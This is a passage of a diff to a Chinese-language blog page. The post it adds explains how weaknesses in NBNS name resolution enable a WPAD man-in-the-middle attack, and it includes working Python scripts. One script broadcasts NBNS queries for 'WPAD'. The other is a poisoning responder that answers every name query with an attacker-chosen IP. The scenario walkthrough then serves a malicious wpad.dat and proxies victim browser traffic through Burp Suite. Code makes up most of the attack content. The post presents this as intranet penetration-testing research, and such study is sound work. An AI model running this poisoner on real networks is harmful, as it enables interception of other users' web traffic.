class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, struct</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NBNS_Query</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.populate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">populate</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.HOST = <span class="string">'192.168.16.255'</span></span><br><span class="line">        self.PORT = <span class="number">137</span></span><br><span class="line">        self.nqs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">        self.QueryData = (</span><br><span class="line">        <span class="string">"\xa9\xfb"</span>  <span class="comment"># Transaction ID</span></span><br><span class="line">        <span class="string">"\x01\x10"</span>  <span class="comment"># Flags Query</span></span><br><span class="line">        <span class="string">"\x00\x01"</span>  <span class="comment"># Question:1</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>  <span class="comment"># Answer RRS</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>  <span class="comment"># Authority RRS</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>  <span class="comment"># Additional RRS</span></span><br><span class="line">        <span class="string">"\x20"</span>      <span class="comment"># length of Name:32</span></span><br><span class="line">        <span class="string">"NAME"</span>      <span class="comment"># Name   </span></span><br><span class="line">        <span class="string">"\x00"</span>      <span class="comment"># NameNull</span></span><br><span class="line">        <span class="string">"\x00\x20"</span>  <span class="comment"># Query Type:NB</span></span><br><span class="line">        <span class="string">"\x00\x01"</span>) <span class="comment"># Class</span></span><br><span class="line"></span><br><span class="line">        self.data = self.QueryData.replace(<span class="string">'NAME'</span>, struct.pack(<span class="string">"32s"</span>, self.encode_name(self.name)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># From http://code.google.com/p/dpkt/</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_name</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        <span class="string">"""Return the NetBIOS first-level encoded name."""</span></span><br><span class="line">        l = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> struct.pack(<span class="string">'16s'</span>, name):</span><br><span class="line">            c = ord(c)</span><br><span class="line">            l.append(chr((c &gt;&gt; <span class="number">4</span>) + <span class="number">0x41</span>))</span><br><span class="line">            l.append(chr((c &amp; <span class="number">0xf</span>) + <span class="number">0x41</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"NBNS Querying... -&gt; %s"</span> % self.name</span><br><span class="line">            self.nqs.sendto(self.data, (self.HOST, self.PORT))</span><br><span class="line">        self.nqs.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    nbns = NBNS_Query(<span class="string">"WPAD"</span>)</span><br><span class="line">    nbns.Query()</span><br></pre></td></tr></table></figure>
+
+<p>NBNS 应答数据包的具体代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, struct,binascii</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NBNS_Answer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.IPADDR  = addr</span><br><span class="line">        self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        self.init_socket()</span><br><span class="line">        self.populate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">populate</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.AnswerData = (</span><br><span class="line">        <span class="string">"TID"</span>              <span class="comment"># Transaction ID</span></span><br><span class="line">        <span class="string">"\x85\x00"</span>         <span class="comment"># Flags Query</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>         <span class="comment"># Question</span></span><br><span class="line">        <span class="string">"\x00\x01"</span>         <span class="comment"># Answer RRS</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>         <span class="comment"># Authority RRS</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>         <span class="comment"># Additional RRS</span></span><br><span class="line">        <span class="string">"\x20"</span>             <span class="comment"># length of Name:32</span></span><br><span class="line">        <span class="string">"NAME"</span>             <span class="comment"># Name   </span></span><br><span class="line">        <span class="string">"\x00"</span>             <span class="comment"># NameNull</span></span><br><span class="line">        <span class="string">"\x00\x20"</span>         <span class="comment"># Query Type:NB</span></span><br><span class="line">        <span class="string">"\x00\x01"</span>         <span class="comment"># Class</span></span><br><span class="line">        <span class="string">"\x00\x00\x00\xa5"</span> <span class="comment"># TTL</span></span><br><span class="line">        <span class="string">"\x00\x06"</span>         <span class="comment">#</span></span><br><span class="line">        <span class="string">"\x00\x00"</span>         <span class="comment"># Null</span></span><br><span class="line">        <span class="string">"IPADDR"</span>)          <span class="comment"># IP Address</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_socket</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.HOST = <span class="string">"0.0.0.0"</span></span><br><span class="line">        self.PORT = <span class="number">137</span></span><br><span class="line">        self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_name</span><span class="params">(self, nbname)</span>:</span></span><br><span class="line">        <span class="string">"""Return the NetBIOS first-level decoded nbname."""</span></span><br><span class="line">        <span class="keyword">if</span> len(nbname) != <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> nbname</span><br><span class="line">        l = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>, <span class="number">2</span>):</span><br><span class="line">            l.append(chr(((ord(nbname[i]) - <span class="number">0x41</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                         ((ord(nbname[i+<span class="number">1</span>]) - <span class="number">0x41</span>) &amp; <span class="number">0xf</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(l).split(<span class="string">'\x00'</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Answser</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.nas.bind((self.HOST, self.PORT))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Listening..."</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data, addr = self.nas.recvfrom(<span class="number">1024</span>)</span><br><span class="line">            tid  = data[<span class="number">0</span>:<span class="number">2</span>]           </span><br><span class="line">            name = data[<span class="number">13</span>:<span class="number">45</span>]</span><br><span class="line">            data = self.AnswerData.replace(<span class="string">'TID'</span>, tid)</span><br><span class="line">            data = data.replace(<span class="string">'NAME'</span>, name)</span><br><span class="line">            data = data.replace(<span class="string">'IPADDR'</span>, socket.inet_aton(self.IPADDR))</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Poisoned answer(%s) sent to %s for name %s "</span> % (self.IPADDR, addr[<span class="number">0</span>], self.decode_name(name))</span><br><span class="line">            self.nas.sendto(data, addr)</span><br><span class="line">        self.nas.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    nbns = NBNS_Answer(<span class="string">"11.22.33.44"</span>)</span><br><span class="line">    nbns.Answser()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析"><a href="#0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析" class="headerlink" title="0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析"></a>0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析</h3><p>利用 NBNS 名称解析进行基于 WPAD 的中间人攻击本质上还是利用了 Windows 系统的名称解析顺序和 NBNS 协议的缺陷。结合 [WPAD 协议分析及内网渗透利用](./WPAD 协议分析及内网渗透利用) 所述，在工作组环境中，客户端主机执行 WPAD 功能时，会遵循 Windows 系统的名称解析顺序，查询的名称均为 <strong>“WPAD”</strong>。那么，我们先广播进行“WPAD”名称的注册，然后监听 137 端口（如图5），等待局域网其他已启用 WPAD 功能的主机使用 IE 浏览器连接网络时，即可将受害者主机的浏览器代理设置为攻击者指定的代理服务器，之后就可以获得受害者的浏览器的上网记录。</p>
+<p>我们模拟出一个简单的攻击场景，如下图所示：</p>
+<p><img src="/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/20171207135331-f46fc93c-db12-1.png" alt="img"></p>
+<p> 图6：利用 NBNS 名称解析进行基于 WPAD 的中间人攻击 </p>
+<p>攻击者开启 NetBIOS 恶意应答程序，并监听 80 端口提供恶意 PAC 配置文件（wpad.dat）的下载，同时开启代理服务器（这里使用的是 Burp Suite HTTP 代理服务器）；</p>
+<p>受害者主机（Windows XP） 打开 IE 浏览器（已启用 WPAD  功能）开始上网，此时浏览器就会寻找当前局域网中的代理服务器，实际上是进行了 WPAD 的名称查询，可以从图中看到攻击者的恶意应答程序做了恶意响应，同时提供 PAC 配置文件下载的 HTTP 服务器打印出了日志信息，表明此时受害者的浏览器已经下载了恶意 PAC 配置文件（该文件内容为代理服务器地址信息）；</p>
+<p>之后，从 Burp Suite 中可以看到，受害者的浏览器使用了攻击者指定的代理服务器进行上网。</p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>利用 NetBIOS 域名解析协议进行中间人攻击的方式还有很多，关于 NetBIOS 协议的内容可以在相关的 RFC 文档中查阅，其中还有不少东西可以在内网渗透中利用到，如 OPCODE 字段的取值、BROWSER 协议等等，不论是攻击还是防御都需要进一步的研究。</p>
+<p><strong>参考文章：</strong><br><a href="https://xz.aliyun.com/t/1739" target="_blank" rel="noopener">https://xz.aliyun.com/t/1739</a><br><a href="http://blog.sina.com.cn/s/blog_614f473101017e10.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_614f473101017e10.html</a><br><a href="https://www.cnblogs.com/wangaohui/p/5116519.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangaohui/p/5116519.html</a></p>
+
       
 
       
@@ -706,11 +282,15 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">development</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">concept</a>
         		</li>
       		
 		</ul>
@@ -721,10 +301,82 @@ var _hmt = _hmt || [];
       
 
       
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://eW1z4rd.github.io/2019/08/05/利用-NBNS-协议缺陷进行-WPAD-中间人攻击/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2019/08/08/WPAD-协议分析及内网渗透利用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          WPAD 协议分析及内网渗透利用
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/08/02/利用-LLMNR-名称解析缺陷劫持内网指定主机会话/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">利用 LLMNR 名称解析缺陷劫持内网指定主机会话</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -739,260 +391,33 @@ var _hmt = _hmt || [];
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Learn-Git-03-分支管理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/15/Learn-Git-03-分支管理/">Learn Git 03 分支管理</a>
-    </h1>
-  
-
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/06/15/Learn-Git-03-分支管理/" class="archive-article-date">
-  	<time datetime="2019-06-15T06:23:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x06-分支管理"><a href="#0x06-分支管理" class="headerlink" title="0x06 分支管理"></a>0x06 分支管理</h3><h4 id="分支是什么"><a href="#分支是什么" class="headerlink" title="分支是什么"></a>分支是什么</h4><p>分支就是科幻电影里面的平行宇宙，当你正在电脑前努力学习Git的时候，另一个你正在另一个平行宇宙里努力学习SVN。如果两个平行宇宙互不干扰，那对现在的你也没啥影响。不过，在某个时间点，两个平行宇宙合并了，结果你既学会了Git又学会了SVN！</p>
-<p><img src="/2019/06/15/Learn-Git-03-分支管理/8361248578c67b8067c8c.png" alt="learn-branches"></p>
-        
-          <a class="article-more-a" href="/2019/06/15/Learn-Git-03-分支管理/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">development</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-NetBIOS-相关协议"><span class="toc-number">1.</span> <span class="toc-text">0x00 NetBIOS 相关协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-NBNS-协议分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 NBNS 协议分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-NBNS-名称解析过程"><span class="toc-number">3.</span> <span class="toc-text">0x02 NBNS 名称解析过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Python-实现-NetBIOS-协议的质询与应答"><span class="toc-number">4.</span> <span class="toc-text">0x03 Python 实现 NetBIOS 协议的质询与应答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-总结"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
   
-    <article id="post-Learn-Git-02-版本控制和远程仓库" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/13/Learn-Git-02-版本控制和远程仓库/">Learn Git 02 版本控制和远程仓库</a>
-    </h1>
   
 
-		
-		<!--显示阅读次数-->
-		
-
-        
-        <a href="/2019/06/13/Learn-Git-02-版本控制和远程仓库/" class="archive-article-date">
-  	<time datetime="2019-06-13T12:32:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x04-版本控制"><a href="#0x04-版本控制" class="headerlink" title="0x04 版本控制"></a>0x04 版本控制</h3><h4 id="提交修改"><a href="#提交修改" class="headerlink" title="提交修改"></a>提交修改</h4><p>我们已经成功地添加并提交了一个<code>readme.txt</code>文件，现在，是时候继续工作了，于是，我们继续修改<code>readme.txt</code>文件，改成如下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software.</span><br></pre></td></tr></table></figure>
-
-<p>现在，运行<code>git status</code>命令查看结果：</p>
-        
-          <a class="article-more-a" href="/2019/06/13/Learn-Git-02-版本控制和远程仓库/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">development</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Learn-Git-01-初识Git" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/10/Learn-Git-01-初识Git/">Learn Git 01 初识Git</a>
-    </h1>
   
 
-		
-		<!--显示阅读次数-->
-		
+  
 
-        
-        <a href="/2019/06/10/Learn-Git-01-初识Git/" class="archive-article-date">
-  	<time datetime="2019-06-10T11:40:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x01-Git简介"><a href="#0x01-Git简介" class="headerlink" title="0x01 Git简介"></a>0x01 Git简介</h3><h4 id="Git是什么"><a href="#Git是什么" class="headerlink" title="Git是什么"></a>Git是什么</h4><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
-<p>那什么是版本控制系统？</p>
-<p>如果你用Microsoft Word写过长篇大论，那你一定有这样的经历：</p>
-<p>想删除一个段落，又怕将来想恢复找不回来怎么办？有办法，先把当前文件“另存为”一个新的Word文件，再接着改，改到一定程度，再“另存为”一个新文件，这样一直改下去，最后你会有很多个Word副本。</p>
-<p>过了一周，你想找回被删除的文字，但是已经记不清删除前保存在哪个文件里了，只好一个一个文件去找，真麻烦。</p>
-        
-          <a class="article-more-a" href="/2019/06/10/Learn-Git-01-初识Git/#more">阅读全文 >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">development</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
+  
   
   
 
@@ -1023,8 +448,8 @@ var _hmt = _hmt || [];
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
